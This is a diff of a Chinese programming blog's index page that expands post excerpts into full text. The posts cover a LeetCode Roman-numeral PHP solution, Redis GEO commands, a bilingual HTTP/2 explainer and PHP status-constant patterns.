@@ -408,16 +408,38 @@
       
         
           
-          题目罗马数字包含以下七种字符: I， V，X， L，C，D 和 M。
-12345678字符          数值I             1V             5X             10L             50C             100D             
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/算法/roman-to-integer/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>罗马数字包含以下七种字符: <code>I</code>， <code>V</code>，<code>X</code>， <code>L</code>，<code>C</code>，<code>D</code> 和 <code>M</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符          数值</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure>
+<p>例如， 罗马数字 2 写做 <code>II</code> ，即为两个并列的 1。12 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 27 写做  <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p>
+<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p>
+<ul>
+<li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li>
+<li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。</li>
+<li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li>
+</ul>
+<p>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p>
+<p>示例 1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;III&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>
+<p>示例 2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;IV&quot;</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>
+<p>示例 3:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;IX&quot;</span><br><span class="line">输出: 9</span><br></pre></td></tr></table></figure>
+<p>示例 4:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;LVIII&quot;</span><br><span class="line">输出: 58</span><br><span class="line">解释: L = 50, V= 5, III = 3.</span><br></pre></td></tr></table></figure>
+<p>示例 5:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;MCMXCIV&quot;</span><br><span class="line">输出: 1994</span><br><span class="line">解释: M = 1000, CM = 900, XC = 90, IV = 4.</span><br></pre></td></tr></table></figure>
+<p><a href="https://leetcode-cn.com/problems/roman-to-integer/" target="_blank" rel="noopener">题目链接</a></p>
+<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ul>
+<li>如果 I 在 V 或 X 之前, 减去 1 如: IV = 4 and IX = 9</li>
+<li>如果 X 在 L 或 C 之前, 减去 10 如: XL = 40 and XC = 90</li>
+<li>如果 C 在 D 或 M 之前, 减去 100 如: CD = 400 and CM = 900</li>
+</ul>
+<h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><ul>
+<li>数学</li>
+<li>字符串</li>
+</ul>
+<h2 id="个人解答"><a href="#个人解答" class="headerlink" title="个人解答"></a>个人解答</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">romanToInt</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $map = [</span><br><span class="line">        <span class="string">'I'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'V'</span> =&gt; <span class="number">5</span>,</span><br><span class="line">        <span class="string">'X'</span> =&gt; <span class="number">10</span>,</span><br><span class="line">        <span class="string">'L'</span> =&gt; <span class="number">50</span>,</span><br><span class="line">        <span class="string">'C'</span> =&gt; <span class="number">100</span>,</span><br><span class="line">        <span class="string">'D'</span> =&gt; <span class="number">500</span>,</span><br><span class="line">        <span class="string">'M'</span> =&gt; <span class="number">1000</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    $len = strlen($s);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($i &lt; $len - <span class="number">1</span>) &amp;&amp; ($map[$s&#123;$i&#125;] &lt; $map[$s&#123;$i+<span class="number">1</span>&#125;]])) &#123;</span><br><span class="line">            $num -= $map[$s&#123;$i&#125;];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $num += $map[$s&#123;$i&#125;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          
         
       
     </div>
@@ -567,16 +589,10 @@
       
         
           
-          说明reids 里自带的一个坐标定位方法。
-使用123456789101112131415161718192021222324252627282930313233&lt;?php$redis = new Redis();$redis-&gt;connect("127.0.0.1", 6379);$r
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/功能/redis-geo/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>reids 里自带的一个坐标定位方法。</p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">$redis-&gt;auth(<span class="string">'you_password'</span>);</span><br><span class="line">$redis-&gt;select(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加坐标</span></span><br><span class="line">$key = <span class="string">'7-Eleven'</span>;</span><br><span class="line"><span class="keyword">list</span>($x, $y) = [<span class="number">23.1194200000</span>,<span class="number">113.4155300000</span>];</span><br><span class="line">$region = <span class="string">"广州车坡分店"</span>;</span><br><span class="line">$redis-&gt;geoAdd($key, $x, $y, $region);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新坐标</span></span><br><span class="line"><span class="keyword">list</span>($x, $y) = [<span class="number">25.1194200000</span>,<span class="number">114.4155300000</span>];</span><br><span class="line">$redis-&gt;geoAdd();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除坐标</span></span><br><span class="line">$redis-&gt;del($key);</span><br><span class="line"></span><br><span class="line">$redis-&gt;zRem($key, $region);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 店铺经纬度</span></span><br><span class="line">$redis-&gt;geoPos($key, $region);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 店铺与店铺之间的距离</span></span><br><span class="line">$redis-&gt;geoDist($key, $region, $region, <span class="string">'km'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 附近的店</span></span><br><span class="line">$options = [</span><br><span class="line">    <span class="string">'ASC'</span></span><br><span class="line">];</span><br><span class="line">$redis-&gt;geoRadius($key, <span class="number">-157.858</span>, <span class="number">21.306</span>, <span class="number">1</span>, <span class="string">'km'</span>, $options):</span><br></pre></td></tr></table></figure>
+
+          
         
       
     </div>
@@ -726,18 +742,76 @@
       
         
           
-          Before diving straight into the topic, let’s first look at some of the HTTP/2 terminologies used frequently.
-在深入讨论之前，让我们先看下经常使用的一些 HTTP/2 的术语。
+            <p>Before diving straight into the topic, let’s first look at some of the HTTP/2 terminologies used frequently.</p>
+<p>在深入讨论之前，让我们先看下经常使用的一些 HTTP/2 的术语。</p>
+<ul>
+<li>Stream: An established bidirectional connection which may carry one or more messages</li>
+<li>Message: A complete sequence of frames that represents a request or response message</li>
+<li>Frame: The smallest unit of communication in HTTP/2. Each frame contains a frame header which could identify the stream to which the frame belongs.</li>
+<li><p>h2: Short term for HTTP/2</p>
+</li>
+<li><p>流: 已建立的双向连接，可以携带一个或多个消息</p>
+</li>
+<li>消息: 表示请求或响应消息的完整帧序列</li>
+<li>帧: HTTP/2 中最小的通信单位。 每个帧包含一个帧头，它可以识别帧所属的流。</li>
+<li>h2: HTTP/2 的短期</li>
+</ul>
+<p><strong>Note:</strong> It was originally named as HTTP/2.0 but later “.0” part was dropped because it has caused some confusions with HTTP/1.x. So we no longer use HTTP/2.0, it’s HTTP/2 or h2 for short 😊</p>
+<p><strong>注意:</strong> 它最初被命名为 HTTP/2.0，但后来“.0”部分被删除，因为它引起了 HTTP/1.x 的一些混淆。 所以我们不再使用 HTTP/2.0，简而言之是 HTTP/2 或 h2</p>
+<h2 id="Overview-of-HTTP-2"><a href="#Overview-of-HTTP-2" class="headerlink" title="Overview of HTTP/2"></a>Overview of HTTP/2</h2><h2 id="HTTP-2-的概念"><a href="#HTTP-2-的概念" class="headerlink" title="HTTP/2 的概念"></a>HTTP/2 的概念</h2><p>HTTP/2 is a major revision of the HTTP network protocol which is still being widely used over the World Wide Web. It was developed to overcome some of the drawbacks found in HTTP/1.0 and HTTP/1.1 versions. Overhead of repetitive headers and <strong>Head-of-line blocking</strong> (HOL blocking — when one request is blocking others from completing) are two such major problems addressed.</p>
+<p>HTTP/2 是 HTTP 网络协议的主要修订版，它仍在万维网上广泛使用。 它的开发是为了克服 HTTP/1.0 和 HTTP/1.1 版本中的一些缺点。 重复标题和 <strong>行头阻塞</strong> 的开销（HOL 阻止 - 当一个请求阻止其他人完成时）是两个这样的主要问题。</p>
+<p>HTTP/2 enables more efficient use of network resources, header fields compression, multiple concurrent exchanges on the same connection reducing the latency to a great extent.</p>
+<p>HTTP/2 可以更有效地使用网络资源，头字段压缩，同一连接上的多个并发交换，在很大程度上减少了延迟。</p>
+<p>HTTP/2 also introduces <strong>Server Push</strong> that allows a server to send desired data to a client that the server anticipates the client will need in the future. Thus, HTTP/2 provides enhanced security, speed, and usability.</p>
+<p>HTTP/2 还引入了 <strong>服务器推送</strong>，允许服务器将所需数据发送到服务器预期客户端将来需要的客户端。 因此，HTTP/2 提供增强的安全性，速度和可用性。</p>
+<p>HTTP/2 uses the same URI scheme and shares the same default HTTP ports as of HTTP/1.1.</p>
+<p>HTTP/2 使用相同的 URI 方案，并共享与 HTTP/1.1 相同的默认 HTTP 端口。</p>
+<p>All communication is performed over a single TCP connection that can carry any number of <strong>bidirectional</strong> streams. Each stream has a unique identifier and optional priority information that is used to carry bidirectional messages. The frame is the unit of communication and there are several types of frames such as HEADER, DATA, and SETTINGS. For request and response communication, HEADER and DATA frames are primarily being used.</p>
+<p>所有通信都通过单个 TCP 连接执行，该连接可以承载任意数量的 <strong>双向流</strong>。每个流都有唯一的标识符和可选的优先级信息，用于携带双向消息。帧是通信单元，有几种类型的帧，如 HEADER、DATA 和 SETTINGS。 对于请求和响应通信，主要使用 HEADER 和 DATA 帧。</p>
+<h2 id="Key-benefits-of-HTTP-2"><a href="#Key-benefits-of-HTTP-2" class="headerlink" title="Key benefits of HTTP/2"></a>Key benefits of HTTP/2</h2><h2 id="HTTP-2-的主要优点"><a href="#HTTP-2-的主要优点" class="headerlink" title="HTTP/2 的主要优点"></a>HTTP/2 的主要优点</h2><h3 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h3><p>Unlike in HTTP/1.1 where each transfer has to wait till other transfers complete, in HTTP/2, multiple requests are allowed at the same time on the same connection.</p>
+<p>与 HTTP/1.1 中的情况不同，其中每个传输必须等到其他传输完成，在 HTTP/2 中，在同一连接上同时允许多个请求。</p>
+<p>In HTTP/1.x, only one response can be delivered at a time per connection, and if the client wants to make multiple parallel requests, then multiple TCP connections must be used. This also results in head-of-line-blocking and inefficient use of underlying TCP connection.</p>
+<p>在 HTTP/1.x 中，每个连接一次只能传递一个响应，如果客户端想要进行多个并行请求，则必须使用多个 TCP 连接。 这也会导致线头阻塞和底层 TCP 连接的低效使用。</p>
+<p>HTTP/2 overcomes these limitations by using the new binary framing layer ( where all HTTP/2 communication is split into smaller messages and frames and each of them is encoded in binary format so that both the client and server must use the new binary encoding mechanism in order to understand each other. Thus, an HTTP/1.x client will not understand an HTTP/2 only server and vice versa. ) by allowing the client and server to break down a message into independent frames, interleave them and reassemble them on the other end.</p>
+<p>HTTP/2 通过使用新的二进制成帧层克服了这些限制（其中所有 HTTP/2 通信被分成更小的消息和帧，并且每个都以二进制格式编码，因此客户端和服务器都必须使用新的二进制编码机制因此，HTTP/1.x 客户端将无法理解仅 HTTP/2 服务器，反之亦然。）允许客户端和服务器将消息分解为独立的帧，交错并重新组合它们在另一端。</p>
+<p>For example,</p>
+<p>例如，</p>
+<p><img src="/img/review/0_L1GIOY16SV94h7MQ.png" alt></p>
+<p>The above diagram illustrates multiple streams within the same connection. The client is transmitting a DATA frame over stream 5 to the server, while the server is transmitting an interleaved sequence of frames to the client over stream 1 and 3.</p>
+<p>上图说明了同一连接中的多个流。 客户端通过流 5 将 DATA 帧发送到服务器，而服务器通过流 1 和 3 将交错的帧序列发送到客户端。</p>
+<p>This also enables several performance benefits such as remove unnecessary HTTP/1/x workarounds in concatenated files, image sprites and domain sharding ( for further read refer: <a href="https://hpbn.co/optimizing-application-delivery/#optimizing-for-http1x" target="_blank" rel="noopener">Optimizing for HTTP/1.x</a> ), reduce the page load time by removing unnecessary latency and improving the utilization of available network capacity.</p>
+<p>这还可以带来一些性能优势，例如在连接文件，图像精灵和域分片中删除不必要的 HTTP/1/x 变通方法（ 有关进一步阅读，请参阅： <a href="https://hpbn.co/optimizing-application-delivery/#optimizing-for-http1x" target="_blank" rel="noopener">优化 HTTP/1.x</a>），通过消除不必要的延迟并提高可用网络容量的利用率来减少页面加载时间。</p>
+<h3 id="Header-compression"><a href="#Header-compression" class="headerlink" title="Header compression"></a>Header compression</h3><h3 id="标头压缩"><a href="#标头压缩" class="headerlink" title="标头压缩"></a>标头压缩</h3><p>As web pages have grown to require dozens to hundreds of requests, the redundant header fields in these requests unnecessarily consume bandwidth, measurably increasing latency. So, HTTP/2 forces all HTTP headers to be sent in a compressed format, reducing the amount of information that needs to be exchanged between the client’s browser and the server whereas HTTP/1.1 does not provide any form of header compression.</p>
+<p>随着网页变得需要数十到数百个请求，这些请求中的冗余头字段不必要地消耗带宽，可测量地增加了延迟。 因此，HTTP/2 强制所有 HTTP 标头以压缩格式发送，减少了客户端浏览器和服务器之间需要交换的信息量，而 HTTP/1.1 不提供任何形式的标头压缩。</p>
+<p>The compression works on per connection basis. That is, all the streams in one connection share the same compressor. If the compressor realizes that it has sent a header before, it will not resend that header, instead just says ‘the same header as before’. So, some headers that never change like Host, Accept or Cookies will not get resent, and that will save a lot of bytes! 😃</p>
+<p>压缩适用于每个连接。也就是说，一个连接中的所有流共享相同的压缩器。如果压缩器意识到它之前已经发送了一个报头，它将不会重新发送该报头，而只是说“与之前相同的报头”。 因此，一些永远不会像 Host、Accept 或 Cookies 那样改变的标题将不会被重新发送，这将节省大量的字节！</p>
+<h3 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h3><h3 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h3><p>Through the server push, additional resources can be sent to the client for future use, before the client even requests them.</p>
+<p>通过服务器推送，可以在客户端甚至请求之前将其他资源发送到客户端以供将来使用。</p>
+<p>Here, the server understands which resources the browser needs before the browser requests for them. Then the server will push these resources to the browser before it requests for them. This makes the entire process of retrieving all resources much faster.</p>
+<p>在这里，服务器了解浏览器在浏览器请求之前需要哪些资源。 然后，服务器会在请求它们之前将这些资源推送到浏览器。 这使得检索所有资源的整个过程更快。</p>
+<p>As an example when a browser requests a web page, a server responds with an HTML page and browser has to parse it and request again all embedded assets such as images, CSS and JavaScript files. In HTTP/2, using the server push concept a server can be configured to send all required assets according to a client’s request before the client requests them explicitly.</p>
+<p>作为浏览器请求网页的示例，服务器响应 HTML 页面，浏览器必须解析它并再次请求所有嵌入的资源，例如图像，CSS 和 JavaScript 文件。 在 HTTP/2 中，使用服务器推送概念，可以将服务器配置为在客户端明确请求之前根据客户端的请求发送所有必需的资产。</p>
+<h3 id="Stream-Priority"><a href="#Stream-Priority" class="headerlink" title="Stream Priority"></a>Stream Priority</h3><h3 id="流的优先级"><a href="#流的优先级" class="headerlink" title="流的优先级"></a>流的优先级</h3><p>While multiplexing enables sending multiple requests concurrently, stream priority enables you to define which response should come first. I.e. it helps you to define the importance of one stream relative to the other streams on the same connection via weight and dependency associated with each stream. As a result, we can optimize the resource usage via controlling the allocation of CPU, memory, bandwidth and many other resources while ensuring the delivery of high priority responses to the client.</p>
+<p>虽然多路复用可以同时发送多个请求，但流优先级使您可以定义应该首先响应的响应。 也就是说，它可以帮助您通过与每个流关联的权重和依赖关系来定义一个流相对于同一连接上的其他流的重要性。 因此，我们可以通过控制 CPU，内存，带宽和许多其他资源的分配来优化资源使用，同时确保向客户端传递高优先级响应。</p>
+<h3 id="Flow-control"><a href="#Flow-control" class="headerlink" title="Flow control"></a>Flow control</h3><h3 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h3><p>This is introduced to prevent any destructive interference on streams with each other that are in the same connection that might have caused as a result of multiplexing which introduces contention over use of the TCP connection causing blocked streams. Flow control is used for both individual streams and for the connection as a whole.</p>
+<p>引入这是为了防止对由于多路复用而可能导致的相同连接的流相互之间的任何破坏性干扰，这引起了对使用 TCP 连接导致阻塞流的争用。 流量控制用于单个流和整个连接。</p>
+<h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><p>HTTP/2 handles two classes of errors.</p>
+<p>HTTP/2 处理两类错误</p>
+<ol>
+<li>Connection error — any error that prevents further processing of the frame layer or corrupts any connection state.</li>
+<li><p>Stream error — an error related to a specific stream that does not affect the processing of other streams.</p>
+</li>
+<li><p>连接错误 — 任何阻止进一步处理帧层或破坏任何连接状态的错误。</p>
+</li>
+<li>流错误 — 与特定流相关的错误，不会影响其他流的处理。</li>
+</ol>
+<p>I will be talking on How to Write an HTTP/2 Service and a Client in my next story 😊</p>
+<p>我将在下一个故事中讨论如何编写 HTTP/2 服务和客户端😊</p>
+<p>Mar 11,2019 （2019-03-11）</p>
+<p>author: Varuni Punchihewa</p>
+<p>link: <a href="https://blog.usejournal.com/what-is-http-2-380d277d208c" target="_blank" rel="noopener">https://blog.usejournal.com/what-is-http-2-380d277d208c</a></p>
 
-Stream
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/翻译/what-is-http-2/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
         
       
     </div>
@@ -887,16 +961,17 @@ Stream
       
         
           
-          说明表的状态是我们判断业务到达什么地方的标识，它可以是英文单词，也可以是数字，更可以是枚举。在开发的过程中，有人是直接写状态值，这样很不好维护，如果值变更，他就得把程序里关联的值全部都需要修改。
-处理model 常量model 对应的是数据表来创建的。所以表中的状态字段可以使用常量来表示，使用时直接
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/功能/table-status/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+            <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>表的状态是我们判断业务到达什么地方的标识，它可以是英文单词，也可以是数字，更可以是枚举。在开发的过程中，有人是直接写状态值，这样很不好维护，如果值变更，他就得把程序里关联的值全部都需要修改。</p>
+<h2 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h2><h3 id="model-常量"><a href="#model-常量" class="headerlink" title="model 常量"></a>model 常量</h3><p>model 对应的是数据表来创建的。所以表中的状态字段可以使用常量来表示，使用时直接使用常量访问即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_AUDIT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_DELIVER = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span><span class="params">($where)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $map = [];</span><br><span class="line">        $map[<span class="string">'status'</span>] = <span class="keyword">self</span>::STATUS_TO_AUDIT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="model-静态属性"><a href="#model-静态属性" class="headerlink" title="model 静态属性"></a>model 静态属性</h3><p>静态属性主要的作用是搜索下拉表单（需要格式化处理）和列表状态显示时使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_AUDIT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_DELIVER = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $status = [</span><br><span class="line">        <span class="keyword">self</span>::STATUS_TO_AUDIT =&gt; <span class="string">'待审核'</span>,</span><br><span class="line">        <span class="keyword">self</span>::STATUS_TO_DELIVER =&gt; <span class="string">'待发货'</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="混合状态管理"><a href="#混合状态管理" class="headerlink" title="混合状态管理"></a>混合状态管理</h3><p>混合状态就是表示一种业务状态，需要几个状态字段进行判断才可以确认业务的实际状态。这种混合状态是很不好维护的，因为你在开发中会发现你总是漏改某些字段被挨批。管理这种状态的办法就是把实际状态用数组存储起来。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 订单状态</span></span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_AUDIT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_DELIVER = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> STATUS_SUCCESS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 售后状态</span></span><br><span class="line">    <span class="keyword">const</span> RETURN_NOT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> RETURN_TODO = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> RETURN_ACCESS = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> RETURN_FAIL = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无售后订单</span></span><br><span class="line">    <span class="keyword">private</span> $orderSuccess = [</span><br><span class="line">        <span class="string">'status'</span> =&gt; <span class="keyword">self</span>::STATUS_SUCCESS,</span><br><span class="line">        <span class="string">'return_status'</span> =&gt; <span class="keyword">self</span>::RETURN_NOT,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 售后失败订单</span></span><br><span class="line">    <span class="keyword">private</span> $orderReturnFail = [</span><br><span class="line">        <span class="string">'status'</span> =&gt; <span class="keyword">self</span>::STATUS_SUCCESS,</span><br><span class="line">        <span class="string">'return_status'</span> =&gt; <span class="keyword">self</span>::RETURN_FAIL,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 变更表状态,使用类覆盖</span></span><br><span class="line">    <span class="comment">// $data += $this-&gt;orderReturnFail;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证订单状态</span></span><br><span class="line">    <span class="comment">// foreach ($this-&gt;orderReturnFail as $key =&gt; $value) &#123;</span></span><br><span class="line">    <span class="comment">//     if ($data[$key] != $value) &#123;</span></span><br><span class="line">    <span class="comment">//         return false;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// return true;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="FQA"><a href="#FQA" class="headerlink" title="FQA"></a>FQA</h2><h3 id="验证当前操作的状态值是否合法"><a href="#验证当前操作的状态值是否合法" class="headerlink" title="验证当前操作的状态值是否合法"></a>验证当前操作的状态值是否合法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($status, array_keys(OrderModel::$statusMap)) &#123;</span><br><span class="line">    <span class="comment">// 非法状态值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
